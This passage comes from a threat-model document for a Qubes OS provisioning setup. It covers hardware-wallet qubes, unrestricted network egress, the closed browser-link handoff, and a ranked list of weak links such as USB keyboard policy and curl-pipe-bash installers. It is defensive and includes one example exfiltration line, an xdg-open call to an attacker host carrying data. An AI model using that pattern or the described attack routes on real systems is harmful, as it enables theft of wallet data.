    - A device swapped during shipping, in an evil-maid scenario, or on a contaminated cable / port can present itself as the operator's wallet and talk to whatever software is running in `A-wallet-*` until the user catches it: attempt firmware downgrade, probe via crafted hidraw exchanges, or — if the wallet UI is already unlocked when the substitution happens — script-drive interactions with an open signing dialog.
    - The wallet *protocol* still authenticates the genuine device (passphrase, on-screen confirmation on the Ledger/Trezor itself), so a pure spoofer cannot forge a signed transaction. But it can talk to the host stack, and that surface is non-trivial.
    - There is no automated signal to the operator that "this isn't my real wallet" — the device tree shows the right name. Treat any unfamiliar physical device the same as an unfamiliar repo: confirm provenance before attaching, and prefer attaching the wallet only when actively using it rather than leaving it persistently bound to `A-wallet-*`.
- **Trezor-specific note — no vendor host software ⚠️:** The `trezor` component installs **only** the udev rules. Trezor Suite, Trezor Bridge and `trezorctl` are deliberately not installed; the default `wallet-trezor` qube spec (`trezor brave-extension-rabby`) leaves the in-browser Rabby extension (via WebUSB / WebHID) as the **sole** code path that can speak the Trezor protocol in that qube. Two operational consequences the operator must internalise:
    - **No out-of-browser cross-check.** A user who would normally open Trezor Suite "just to see the same transaction independently" has no second pane of glass here. A compromised Rabby update therefore has no in-qube tool to be cross-checked against — the on-device confirmation screen is the *only* place the operator can read the transaction details from a non-Rabby source. Treat that screen as load-bearing, not as a formality.
    - **Firmware updates and recovery flows live elsewhere.** Trezor firmware updates, recovery-seed checks, and any Suite-only diagnostic require either installing Suite into this qube (not done by SEQS — adds package surface) or attaching the device to a separate trusted machine for those operations. The qube as shipped is a *signing* qube, not a *management* qube.

  If you want a vendor-side host stack despite the surface tradeoff, install `trezor-suite` (AppImage from the vendor — verify against the [Trezor signing key](https://trezor.io/learn/a/check-trezor-suite-signatures)) in the template, or factor a separate `wallet-trezor-suite` qube. The Ledger entry above already pays this cost via the `ledger` component's app-vm phase (`LedgerLive.AppImage`); the Trezor entry deliberately does not, and the asymmetry is worth knowing.

### Wallet qube egress is unrestricted ⚠️
- **Component:** the default wallet qubes (currently `wallet-ledger` and `wallet-trezor`) inherit dom0's default `netvm` (`sys-firewall`) with no `qvm-firewall` allow-list — i.e. these qubes can reach **any** internet host. Same for any future wallet qube added to `qube_list`.
- **Trust assumption:** Every piece of code that ever runs in the wallet qube — Brave, the force-installed wallet extensions, Ledger Live, anything the operator later installs — is honest about *which* hosts it contacts.
- **Established by:** Nothing automated. Qubes' per-qube firewall is left at its default allow-all rule set; SEQS does not impose a destination allow-list because the right one (which RPC endpoints? which block explorers? which dApp domains?) is operator-specific.
- **Residual risk:** This is the silent half of the wallet-qube threat model. A wallet-extension supply-chain compromise (see "Brave wallet extensions ⚠️" in §3) — or a hostile Ledger Live AppImage (see "Ledger Live ❌" in §3) — lands in a qube whose only network rule is "anything outbound, anywhere." Concretely, a hostile Rabby / MetaMask / etc. update can:
    - exfiltrate state the extension has access to (open dApps, populated form fields, wallet addresses, browsing context) to a host of its choosing, without prompting;
    - silently substitute the RPC endpoint or block-explorer URL so the operator sees fabricated balance / quote / gas data while signing requests are routed via a hostile relay;
    - frame social-engineering prompts ("approve this Permit2") that look identical to the legitimate UX because they *are* the legitimate UX, just pointed at an attacker-controlled backend.

  The hardware wallet still enforces *its* on-device confirmation, so the spoofer cannot forge a signed transaction — but the **contents** the operator is asked to confirm come from the host stack, and the host stack has unrestricted egress. Wallet-extension supply-chain incidents (Ledger Connect Kit 2023; the npm chalk/debug compromise in 2024-2025) are recurring; the assumption that "the extension will not phone home maliciously" is empirically not safe.

  Deferred — accepted as a default because RPC endpoint sets are operator-specific. The recommended hardening when you know your endpoints is a per-qube `qvm-firewall` default-deny + explicit allow-list, written from dom0 against the live IP set (typical: your RPC provider's hostnames, `clients2.google.com` for extension auto-update if you keep that channel, and any block-explorer you actually use). The cost is breakage every time an endpoint rotates; the benefit is that the extension no longer faces an open door if it ever turns.

  **One layer is no longer deferred:** the default wallet qube specs carry the `no_handoff` flag, which writes a dom0 qrexec deny rule (28-browser-suppress.policy) for `qubes.OpenURL` from each wallet qube to any target AND skips wiring the per-qube xdg `xdg-open → A-brave` handler. Without this, a compromised wallet extension could ferry data out via `xdg-open https://attacker/?DATA` routed through the open handoff policy — bypassing any `qvm-firewall` lockdown the operator later adds (qvm-firewall does not gate qrexec). The handoff back-channel is now closed by default for wallet qubes; the qvm-firewall lockdown above remains the operator's job for the rest of the egress surface.

---

## Weakest links, ranked

1. **USB-keyboard policy override** (§4) — weakens the Qubes 4.3 default `deny` on `qubes.InputKeyboard sys-usb → dom0` to `ask default_target=@adminvm`. A BadUSB-class device that enumerates as a HID keyboard yields keystroke injection into dom0 = total compromise if the operator reflexively accepts the attach prompt. Accepted in exchange for external USB keyboards working without per-boot `qvm-input-keyboard` ceremony.
2. **Ledger Live** (§3) — Ledger publishes no verifiable artifact for the Linux AppImage and the URL is unversioned, so it can be neither signature-verified nor version-pinned at install time. The post-install replaceability hole is now closed (root-owned `/usr/bin/LedgerLive.AppImage`), but the one-shot install-time trust remains the residual.
3. **curl-pipe-bash installers** (§3) — the `python` (pyenv), `node` (nvm) and `claude-code` components execute unreviewed remote code on install. For pyenv and nvm this is a deliberate tradeoff for dev-version flexibility; see their entries.
4. **`REPO_VM` + the fetch** (§2) — the repo and its host qube are dom0-equivalent in effect because the fetched tree becomes root-executed Salt code. The transfer is validated and protected by a diff-and-`CONTINUE` review gate, but that gate only helps if the operator reads what it shows.

Brave, KeePassXC, Signal, Docker, VS Code, BitBoxApp, Apache OpenOffice and Element (§3) verify their signing keys/signatures against pinned, cross-checked fingerprints, and the keyrings are then `chattr +i`'d so a maintainer-script rewrite of the trust anchor inside an allowlisted package would fail loudly instead of silently rotating; only Ledger Live remains unverifiable.

The browser-link handoff is closed by default for `offline` and `no_handoff` qubes: dom0 denies `qubes.OpenURL`, and the per-qube default browser is not set to the handoff handler. `offline` implies `no_handoff`. The default wallet qubes carry `no_handoff`, and keepass carries `offline`.
